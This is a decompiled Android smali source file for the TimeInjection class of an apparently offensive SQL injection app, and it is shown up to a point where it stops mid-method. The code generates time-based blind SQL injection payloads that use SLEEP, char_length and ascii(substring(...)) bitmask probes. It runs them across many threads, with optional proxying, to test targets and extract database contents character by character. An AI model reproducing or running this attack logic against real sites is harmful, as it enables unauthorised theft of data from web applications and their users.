.class public Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;
.super Ljava/lang/Object;
.source "TimeInjection.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;
    }
.end annotation


# instance fields
.field private injectionModel:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

.field isTimeInjectable:Z

.field private timeMatch:J


# direct methods
.method public constructor <init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V
    .locals 21
    .param p1, "newModel"    # Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    .prologue
    .line 42
    invoke-direct/range {p0 .. p0}, Ljava/lang/Object;-><init>()V

    .line 34
    const-wide/16 v15, 0x5

    move-object/from16 v0, p0

    iput-wide v15, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->timeMatch:J

    .line 40
    const/4 v15, 0x1

    move-object/from16 v0, p0

    iput-boolean v15, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->isTimeInjectable:Z

    .line 43
    move-object/from16 v0, p1

    move-object/from16 v1, p0

    iput-object v0, v1, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->injectionModel:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    .line 46
    move-object/from16 v0, p0

    iget-object v15, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->injectionModel:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-boolean v15, v15, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isProxyfied:Z

    if-eqz v15, :cond_0

    .line 47
    const-string v15, "http.proxyHost"

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->injectionModel:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v16, v0

    move-object/from16 v0, v16

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->proxyAddress:Ljava/lang/String;

    move-object/from16 v16, v0

    invoke-static/range {v15 .. v16}, Ljava/lang/System;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 48
    const-string v15, "http.proxyPort"

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->injectionModel:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v16, v0

    move-object/from16 v0, v16

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->proxyPort:Ljava/lang/String;

    move-object/from16 v16, v0

    invoke-static/range {v15 .. v16}, Ljava/lang/System;->setProperty(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 52
    :cond_0
    const/4 v15, 0x6

    new-array v8, v15, [Ljava/lang/String;

    const/4 v15, 0x0

    const-string v16, "true=false"

    aput-object v16, v8, v15

    const/4 v15, 0x1

    const-string v16, "true%21=true"

    aput-object v16, v8, v15

    const/4 v15, 0x2

    const-string v16, "false%21=false"

    aput-object v16, v8, v15

    const/4 v15, 0x3

    const-string v16, "1=2"

    aput-object v16, v8, v15

    const/4 v15, 0x4

    const-string v16, "1%21=1"

    aput-object v16, v8, v15

    const/4 v15, 0x5

    const-string v16, "2%21=2"

    aput-object v16, v8, v15

    .line 55
    .local v8, "falseTest":[Ljava/lang/String;
    const/4 v15, 0x6

    new-array v13, v15, [Ljava/lang/String;

    const/4 v15, 0x0

    const-string v16, "true=true"

    aput-object v16, v13, v15

    const/4 v15, 0x1

    const-string v16, "false=false"

    aput-object v16, v13, v15

    const/4 v15, 0x2

    const-string v16, "true%21=false"

    aput-object v16, v13, v15

    const/4 v15, 0x3

    const-string v16, "1=1"

    aput-object v16, v13, v15

    const/4 v15, 0x4

    const-string v16, "2=2"

    aput-object v16, v13, v15

    const/4 v15, 0x5

    const-string v16, "1%21=2"

    aput-object v16, v13, v15

    .line 58
    .local v13, "trueTest":[Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v15, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->injectionModel:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-boolean v15, v15, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->stopFlag:Z

    if-eqz v15, :cond_2

    .line 130
    :cond_1
    :goto_0
    return-void

    .line 63
    :cond_2
    invoke-static {}, Ljava/util/concurrent/Executors;->newCachedThreadPool()Ljava/util/concurrent/ExecutorService;

    move-result-object v5

    .line 64
    .local v5, "executorFalseMark":Ljava/util/concurrent/ExecutorService;
    new-instance v9, Ljava/util/ArrayList;

    invoke-direct {v9}, Ljava/util/ArrayList;-><init>()V

    .line 65
    .local v9, "listCallableFalse":Ljava/util/List;, "Ljava/util/List<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;"
    array-length v0, v8

    move/from16 v16, v0

    const/4 v15, 0x0

    :goto_1
    move/from16 v0, v16

    if-lt v15, v0, :cond_5

    .line 69
    const/4 v11, 0x0

    .line 71
    .local v11, "listFalseMark":Ljava/util/List;, "Ljava/util/List<Ljava/util/concurrent/Future<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;>;"
    :try_start_0
    invoke-interface {v5, v9}, Ljava/util/concurrent/ExecutorService;->invokeAll(Ljava/util/Collection;)Ljava/util/List;
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v11

    .line 75
    :goto_2
    invoke-interface {v5}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    .line 82
    :try_start_1
    invoke-interface {v11}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v16

    :cond_3
    invoke-interface/range {v16 .. v16}, Ljava/util/Iterator;->hasNext()Z
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/util/concurrent/ExecutionException; {:try_start_1 .. :try_end_1} :catch_3

    move-result v15

    if-nez v15, :cond_6

    .line 98
    :goto_3
    invoke-static {}, Ljava/util/concurrent/Executors;->newCachedThreadPool()Ljava/util/concurrent/ExecutorService;

    move-result-object v6

    .line 99
    .local v6, "executorTrueMark":Ljava/util/concurrent/ExecutorService;
    new-instance v10, Ljava/util/ArrayList;

    invoke-direct {v10}, Ljava/util/ArrayList;-><init>()V

    .line 100
    .local v10, "listCallableTrue":Ljava/util/List;, "Ljava/util/List<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;"
    array-length v0, v13

    move/from16 v16, v0

    const/4 v15, 0x0

    :goto_4
    move/from16 v0, v16

    if-lt v15, v0, :cond_7

    .line 106
    :try_start_2
    invoke-interface {v6, v10}, Ljava/util/concurrent/ExecutorService;->invokeAll(Ljava/util/Collection;)Ljava/util/List;
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_4

    move-result-object v12

    .line 111
    .local v12, "listTrueMark":Ljava/util/List;, "Ljava/util/List<Ljava/util/concurrent/Future<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;>;"
    invoke-interface {v6}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    .line 118
    :try_start_3
    invoke-interface {v12}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v16

    :cond_4
    invoke-interface/range {v16 .. v16}, Ljava/util/Iterator;->hasNext()Z

    move-result v15

    if-eqz v15, :cond_1

    invoke-interface/range {v16 .. v16}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/util/concurrent/Future;

    .line 119
    .local v7, "falseMark":Ljava/util/concurrent/Future;, "Ljava/util/concurrent/Future<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;"
    move-object/from16 v0, p0

    iget-object v15, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->injectionModel:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-boolean v15, v15, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->stopFlag:Z

    if-nez v15, :cond_1

    .line 120
    invoke-interface {v7}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;

    move-result-object v15

    check-cast v15, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;

    invoke-virtual {v15}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;->isTrue()Z

    move-result v15

    if-nez v15, :cond_4

    .line 121
    const/4 v15, 0x0

    move-object/from16 v0, p0

    iput-boolean v15, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->isTimeInjectable:Z
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/util/concurrent/ExecutionException; {:try_start_3 .. :try_end_3} :catch_5

    goto :goto_0

    .line 125
    .end local v7    # "falseMark":Ljava/util/concurrent/Future;, "Ljava/util/concurrent/Future<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;"
    :catch_0
    move-exception v4

    .line 126
    .local v4, "e2":Ljava/lang/InterruptedException;
    invoke-virtual {v4}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_0

    .line 65
    .end local v4    # "e2":Ljava/lang/InterruptedException;
    .end local v6    # "executorTrueMark":Ljava/util/concurrent/ExecutorService;
    .end local v10    # "listCallableTrue":Ljava/util/List;, "Ljava/util/List<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;"
    .end local v11    # "listFalseMark":Ljava/util/List;, "Ljava/util/List<Ljava/util/concurrent/Future<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;>;"
    .end local v12    # "listTrueMark":Ljava/util/List;, "Ljava/util/List<Ljava/util/concurrent/Future<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;>;"
    :cond_5
    aget-object v14, v8, v15

    .line 66
    .local v14, "urlTest":Ljava/lang/String;
    new-instance v17, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;

    new-instance v18, Ljava/lang/StringBuilder;

    const-string v19, "+and+if("

    invoke-direct/range {v18 .. v19}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v18

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    const-string v19, ",1,SLEEP("

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    move-object/from16 v0, p0

    iget-wide v0, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->timeMatch:J

    move-wide/from16 v19, v0

    invoke-virtual/range {v18 .. v20}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v18

    const-string v19, "))--+"

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v18

    move-object/from16 v0, v17

    move-object/from16 v1, p0

    move-object/from16 v2, v18

    invoke-direct {v0, v1, v2}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;-><init>(Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;Ljava/lang/String;)V

    move-object/from16 v0, v17

    invoke-interface {v9, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 65
    add-int/lit8 v15, v15, 0x1

    goto/16 :goto_1

    .line 72
    .end local v14    # "urlTest":Ljava/lang/String;
    .restart local v11    # "listFalseMark":Ljava/util/List;, "Ljava/util/List<Ljava/util/concurrent/Future<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;>;"
    :catch_1
    move-exception v3

    .line 73
    .local v3, "e1":Ljava/lang/InterruptedException;
    invoke-virtual {v3}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_2

    .line 82
    .end local v3    # "e1":Ljava/lang/InterruptedException;
    :cond_6
    :try_start_4
    invoke-interface/range {v16 .. v16}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/util/concurrent/Future;

    .line 83
    .restart local v7    # "falseMark":Ljava/util/concurrent/Future;, "Ljava/util/concurrent/Future<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;"
    move-object/from16 v0, p0

    iget-object v15, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->injectionModel:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-boolean v15, v15, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->stopFlag:Z

    if-nez v15, :cond_1

    .line 84
    invoke-interface {v7}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;

    move-result-object v15

    check-cast v15, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;

    invoke-virtual {v15}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;->isTrue()Z

    move-result v15

    if-eqz v15, :cond_3

    .line 85
    const/4 v15, 0x0

    move-object/from16 v0, p0

    iput-boolean v15, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->isTimeInjectable:Z
    :try_end_4
    .catch Ljava/lang/InterruptedException; {:try_start_4 .. :try_end_4} :catch_2
    .catch Ljava/util/concurrent/ExecutionException; {:try_start_4 .. :try_end_4} :catch_3

    goto/16 :goto_0

    .line 89
    .end local v7    # "falseMark":Ljava/util/concurrent/Future;, "Ljava/util/concurrent/Future<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;"
    :catch_2
    move-exception v4

    .line 90
    .restart local v4    # "e2":Ljava/lang/InterruptedException;
    invoke-virtual {v4}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_3

    .line 91
    .end local v4    # "e2":Ljava/lang/InterruptedException;
    :catch_3
    move-exception v4

    .line 92
    .local v4, "e2":Ljava/util/concurrent/ExecutionException;
    invoke-virtual {v4}, Ljava/util/concurrent/ExecutionException;->printStackTrace()V

    goto/16 :goto_3

    .line 100
    .end local v4    # "e2":Ljava/util/concurrent/ExecutionException;
    .restart local v6    # "executorTrueMark":Ljava/util/concurrent/ExecutorService;
    .restart local v10    # "listCallableTrue":Ljava/util/List;, "Ljava/util/List<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;"
    :cond_7
    aget-object v14, v13, v15

    .line 101
    .restart local v14    # "urlTest":Ljava/lang/String;
    new-instance v17, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;

    new-instance v18, Ljava/lang/StringBuilder;

    const-string v19, "+and+if("

    invoke-direct/range {v18 .. v19}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v18

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    const-string v19, ",1,SLEEP("

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    move-object/from16 v0, p0

    iget-wide v0, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->timeMatch:J

    move-wide/from16 v19, v0

    invoke-virtual/range {v18 .. v20}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v18

    const-string v19, "))--+"

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v18

    move-object/from16 v0, v17

    move-object/from16 v1, p0

    move-object/from16 v2, v18

    invoke-direct {v0, v1, v2}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;-><init>(Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;Ljava/lang/String;)V

    move-object/from16 v0, v17

    invoke-interface {v10, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 100
    add-int/lit8 v15, v15, 0x1

    goto/16 :goto_4

    .line 107
    .end local v14    # "urlTest":Ljava/lang/String;
    :catch_4
    move-exception v3

    .line 108
    .restart local v3    # "e1":Ljava/lang/InterruptedException;
    invoke-virtual {v3}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_0

    .line 127
    .end local v3    # "e1":Ljava/lang/InterruptedException;
    .restart local v12    # "listTrueMark":Ljava/util/List;, "Ljava/util/List<Ljava/util/concurrent/Future<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;>;"
    :catch_5
    move-exception v4

    .line 128
    .restart local v4    # "e2":Ljava/util/concurrent/ExecutionException;
    invoke-virtual {v4}, Ljava/util/concurrent/ExecutionException;->printStackTrace()V

    goto/16 :goto_0
.end method

.method static synthetic access$0(Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;)J
    .locals 2

    .prologue
    .line 34
    iget-wide v0, p0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->timeMatch:J

    return-wide v0
.end method


# virtual methods
.method public callUrl(Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p1, "urlString"    # Ljava/lang/String;

    .prologue
    .line 316
    iget-object v0, p0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->injectionModel:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->injectionModel:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v2, v2, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->insertionCharacter:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->inject(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public inject(Ljava/lang/String;Lnet/edgard/droidsqli/mvc/model/Interruptable;Lnet/edgard/droidsqli/mvc/model/Stoppable;)Ljava/lang/String;
    .locals 25
    .param p1, "inj"    # Ljava/lang/String;
    .param p2, "interruptable"    # Lnet/edgard/droidsqli/mvc/model/Interruptable;
    .param p3, "s"    # Lnet/edgard/droidsqli/mvc/model/Stoppable;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lnet/edgard/droidsqli/exception/StoppableException;
        }
    .end annotation

    .prologue
    .line 142
    const/4 v4, 0x1

    .line 148
    .local v4, "IS_LENGTH_TEST":Z
    new-instance v6, Ljava/util/ArrayList;

    invoke-direct {v6}, Ljava/util/ArrayList;-><init>()V

    .line 150
    .local v6, "bytes":Ljava/util/List;, "Ljava/util/List<[C>;"
    const/4 v11, 0x0

    .line 153
    .local v11, "indexCharacter":I
    const/16 v18, 0x96

    invoke-static/range {v18 .. v18}, Ljava/util/concurrent/Executors;->newFixedThreadPool(I)Ljava/util/concurrent/ExecutorService;

    move-result-object v17

    .line 154
    .local v17, "taskExecutor":Ljava/util/concurrent/ExecutorService;
    new-instance v16, Ljava/util/concurrent/ExecutorCompletionService;

    invoke-direct/range {v16 .. v17}, Ljava/util/concurrent/ExecutorCompletionService;-><init>(Ljava/util/concurrent/Executor;)V

    .line 157
    .local v16, "taskCompletionService":Ljava/util/concurrent/CompletionService;, "Ljava/util/concurrent/CompletionService<Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;>;"
    new-instance v18, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;

    new-instance v19, Ljava/lang/StringBuilder;

    const-string v20, "+and+if(char_length("

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v19

    move-object/from16 v1, p1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, ")>0,1,SLEEP("

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-wide v0, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->timeMatch:J

    move-wide/from16 v20, v0

    invoke-virtual/range {v19 .. v21}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "))--+"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    const/16 v20, 0x1

    move-object/from16 v0, v18

    move-object/from16 v1, p0

    move-object/from16 v2, v19

    move/from16 v3, v20

    invoke-direct {v0, v1, v2, v3}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;-><init>(Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;Ljava/lang/String;Z)V

    move-object/from16 v0, v16

    move-object/from16 v1, v18

    invoke-interface {v0, v1}, Ljava/util/concurrent/CompletionService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 159
    const/4 v14, 0x1

    .line 162
    .local v14, "submittedTasks":I
    :cond_0
    :goto_0
    if-gtz v14, :cond_1

    .line 231
    :try_start_0
    invoke-interface/range {v17 .. v17}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    .line 232
    const-wide/16 v18, 0xf

    sget-object v20, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-interface/range {v17 .. v20}, Ljava/util/concurrent/ExecutorService;->awaitTermination(JLjava/util/concurrent/TimeUnit;)Z
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_4

    .line 238
    :goto_1
    const-string v12, ""

    .line 239
    .local v12, "result":Ljava/lang/String;
    invoke-interface {v6}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v18

    :goto_2
    invoke-interface/range {v18 .. v18}, Ljava/util/Iterator;->hasNext()Z

    move-result v19

    if-nez v19, :cond_8

    .line 247
    return-object v12

    .line 164
    .end local v12    # "result":Ljava/lang/String;
    :cond_1
    invoke-virtual/range {p3 .. p3}, Lnet/edgard/droidsqli/mvc/model/Stoppable;->isPreparationStopped()Z

    move-result v18

    if-nez v18, :cond_2

    if-eqz p2, :cond_4

    invoke-virtual/range {p2 .. p2}, Lnet/edgard/droidsqli/mvc/model/Interruptable;->isInterrupted()Z

    move-result v18

    if-eqz v18, :cond_4

    .line 165
    :cond_2
    invoke-interface/range {v17 .. v17}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    .line 168
    const/4 v15, 0x0

    .line 170
    .local v15, "success":Z
    const-wide/16 v18, 0x0

    :try_start_1
    sget-object v20, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-interface/range {v17 .. v20}, Ljava/util/concurrent/ExecutorService;->awaitTermination(JLjava/util/concurrent/TimeUnit;)Z
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0

    move-result v15

    .line 174
    :goto_3
    if-nez v15, :cond_3

    .line 176
    invoke-interface/range {v17 .. v17}, Ljava/util/concurrent/ExecutorService;->shutdownNow()Ljava/util/List;

    .line 179
    :cond_3
    new-instance v18, Lnet/edgard/droidsqli/exception/StoppableException;

    invoke-direct/range {v18 .. v18}, Lnet/edgard/droidsqli/exception/StoppableException;-><init>()V

    throw v18

    .line 171
    :catch_0
    move-exception v10

    .line 172
    .local v10, "e":Ljava/lang/InterruptedException;
    invoke-virtual {v10}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_3

    .line 183
    .end local v10    # "e":Ljava/lang/InterruptedException;
    .end local v15    # "success":Z
    :cond_4
    :try_start_2
    invoke-interface/range {v16 .. v16}, Ljava/util/concurrent/CompletionService;->take()Ljava/util/concurrent/Future;

    move-result-object v18

    invoke-interface/range {v18 .. v18}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;

    .line 185
    .local v9, "currentCallable":Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;
    add-int/lit8 v14, v14, -0x1

    .line 191
    invoke-static {v9}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;->access$1(Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;)Z

    move-result v18

    if-eqz v18, :cond_6

    .line 192
    invoke-virtual {v9}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;->isTrue()Z

    move-result v18

    if-eqz v18, :cond_0

    .line 193
    add-int/lit8 v11, v11, 0x1

    .line 195
    const/16 v18, 0x8

    move/from16 v0, v18

    new-array v0, v0, [C

    move-object/from16 v18, v0

    fill-array-data v18, :array_0

    move-object/from16 v0, v18

    invoke-interface {v6, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 197
    new-instance v18, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;

    new-instance v19, Ljava/lang/StringBuilder;

    const-string v20, "+and+if(char_length("

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v19

    move-object/from16 v1, p1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, ")>"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, v19

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, ",1,SLEEP("

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-wide v0, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->timeMatch:J

    move-wide/from16 v20, v0

    invoke-virtual/range {v19 .. v21}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "))--+"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    const/16 v20, 0x1

    move-object/from16 v0, v18

    move-object/from16 v1, p0

    move-object/from16 v2, v19

    move/from16 v3, v20

    invoke-direct {v0, v1, v2, v3}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;-><init>(Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;Ljava/lang/String;Z)V

    move-object/from16 v0, v16

    move-object/from16 v1, v18

    invoke-interface {v0, v1}, Ljava/util/concurrent/CompletionService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 199
    const/16 v18, 0x8

    move/from16 v0, v18

    new-array v0, v0, [I

    move-object/from16 v19, v0

    fill-array-data v19, :array_1

    move-object/from16 v0, v19

    array-length v0, v0

    move/from16 v20, v0

    const/16 v18, 0x0

    :goto_4
    move/from16 v0, v18

    move/from16 v1, v20

    if-lt v0, v1, :cond_5

    .line 203
    add-int/lit8 v14, v14, 0x9

    .line 209
    goto/16 :goto_0

    .line 199
    :cond_5
    aget v5, v19, v18

    .line 200
    .local v5, "bit":I
    new-instance v21, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;

    new-instance v22, Ljava/lang/StringBuilder;

    const-string v23, "+and+if(ascii(substring("

    invoke-direct/range {v22 .. v23}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v22

    move-object/from16 v1, p1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    const-string v23, ","

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    move-object/from16 v0, v22

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v22

    const-string v23, ",1))%26"

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    move-object/from16 v0, v22

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v22

    const-string v23, ",1,SLEEP("

